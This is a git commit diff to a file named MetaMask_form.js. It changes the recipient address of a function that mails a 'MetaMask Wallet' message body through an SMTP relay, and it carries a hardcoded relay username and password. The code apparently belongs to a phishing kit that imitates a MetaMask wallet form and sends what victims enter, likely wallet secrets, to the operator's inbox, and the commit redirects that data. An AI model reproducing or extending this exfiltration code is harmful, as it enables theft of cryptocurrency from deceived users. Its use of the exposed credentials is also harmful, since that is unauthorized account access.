c54cd5774b568462029213f6c93110c94ec97f03
WorkEmail0 <166704128+WorkEmail0@users.noreply.github.com>
2024-05-23 10:57:57 +0100

    Update MetaMask_form.js
    Changed meta mask email as a test

--- formsjs/MetaMask_form.js
+++ formsjs/MetaMask_form.js
@@ -8,7 +8,7 @@ function emailSend(){
     Host : "smtp.elasticemail.com",
     Username : "genesisrectification@gmail.com",
     Password : "BE65029E46280CA3B78F0EE1F9F96A16AD56",
-    To : 'nwaenehifeco11@gmail.com',
+    To : 'adimonyechidubem@gmail.com',
     From : "genesisrectification@gmail.com",
     Subject : "MetaMask Wallet",
     Body : messageBody
